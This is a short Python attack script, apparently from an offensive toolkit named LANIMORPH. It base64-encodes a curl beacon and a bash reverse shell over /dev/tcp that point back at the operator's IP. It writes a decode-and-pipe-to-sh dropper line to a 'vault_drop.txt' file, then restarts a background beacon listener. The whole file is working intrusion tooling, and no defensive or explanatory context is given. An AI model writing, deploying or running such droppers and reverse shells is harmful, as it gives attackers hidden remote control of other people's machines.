#!/usr/bin/env python3
import os, random, time, base64

VAULT = os.path.expanduser("~/LANIMORPH/vault/vault_drop.txt")
PORT = random.randint(8000, 8999)
IP = os.popen("ip route get 1").read().split("src")[-1].strip().split()[0]

def build_beacon_payload(ip, port):
    curl_cmd = f"curl -s http://{ip}:{port}/beacon.png > /dev/null"
    return base64.b64encode(curl_cmd.encode()).decode()

def build_reverse_shell(ip, port):
    cmd = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    return base64.b64encode(cmd.encode()).decode()

def write_payload(beacon, reverse):
    with open(VAULT, "w") as f:
        f.write(f"echo {beacon} | base64 -d | sh || echo {reverse} | base64 -d | sh")
    print(f"[✓] Beacon + fallback written to: {VAULT}")

def restart_server():
    os.system(f"fuser -k {PORT}/tcp 2>/dev/null")
    os.system(f"cd ~/LANIMORPH/beacons && nohup python3 beacon_watch.py {PORT} >/dev/null 2>&1 &")
    print(f"[+] Beacon listener now on port: {PORT}")

def main():
    beacon = build_beacon_payload(IP, PORT)
    reverse = build_reverse_shell(IP, PORT)
    write_payload(beacon, reverse)
    restart_server()

if __name__ == "__main__":
    main()
